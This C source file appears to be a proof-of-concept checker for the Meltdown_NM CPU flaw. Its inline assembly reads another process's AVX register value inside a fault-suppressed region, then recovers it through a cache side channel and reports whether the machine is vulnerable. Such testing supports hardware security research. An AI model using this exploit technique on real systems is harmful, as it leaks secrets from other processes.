#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "libcache/cache.h"
#include "lib/global.h"

void main(int argc, char **argv)
{
    PREPARE();
    printf("Meltdown_NM Begins!\n");
    // Flush our shared memory
    flush_shared_memory();

    for (int r = 0; r < MAX_TRY_TIMES; r++)
    {
        if (try_start())
        {
            // Encode the data from the AVX register of the other process in the cache
            asm volatile("1:\n"
                         "movq (%%rsi), %%rsi\n"
                         "movq %%xmm0, %%rax\n"
                         "shl $12, %%rax\n"
                         "jz 1b\n"
                         "movq (%%rbx,%%rax,1), %%rbx\n"
                         :
                         : "b"(mem), "S"(0)
                         : "rax");
            try_abort();
        }
        try_end();

        // Recover data from the cache
        if (cache_decode() == 'S')
        {
            passed_count++;
        }
        // printf("%c ", cache_decode());
    }
    printf("%d\n", passed_count);
    if ((double)passed_count / MAX_TRY_TIMES > 0.3)
    {
        printf(ANSI_COLOR_RED "Meltdown_NM: Vulnerable\n" ANSI_COLOR_RESET);
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Meltdown_NM: Not Vulnerable\n" ANSI_COLOR_RESET);
    }
    printf("Meltdown_NM Done!\n");
}